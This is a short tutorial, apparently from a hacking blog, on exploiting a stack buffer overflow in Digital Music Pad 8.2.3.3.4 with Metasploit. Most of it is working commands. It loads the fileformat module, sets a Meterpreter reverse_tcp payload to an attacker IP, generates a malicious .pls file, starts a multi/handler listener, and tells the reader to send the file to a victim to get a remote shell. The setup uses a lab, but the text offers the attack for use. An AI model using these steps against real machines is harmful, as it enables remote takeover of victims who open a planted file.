Hacked Remote PC Using Digital Music Pad Version 8.2.3.3.4 Stack Buffer Overflow

This module exploits a buffer overflow in Digital Music Pad Version 8.2.3.3.4 when opening a malicious pls file with the Digital Music Pad, a remote attacker could overflow a buffer and execute arbitrary code
Windows XP SP 3
Digital Music Pad Version 8.2.3.3.4
Attacker: Backtrack 5
Victim PC: Windows XP
Open Kali Linux terminal type msfconsole

Now type use exploit/windows/fileformat/digital_music_pad_pls
msf exploit (digital_music_pad_pls)>set payload windows/meterpreter/reverse_tcp 
msf exploit (digital_music_pad_pls)>set lhost 192.168.1.5 (IP of Local Host)
msf exploit (digital_music_pad_pls)>exploit

After we successfully generate the malicious s3m File, it will stored on your local computer
/root/.msf4/local/msf.pls

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.5
exploit
Now send your msf.pls files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
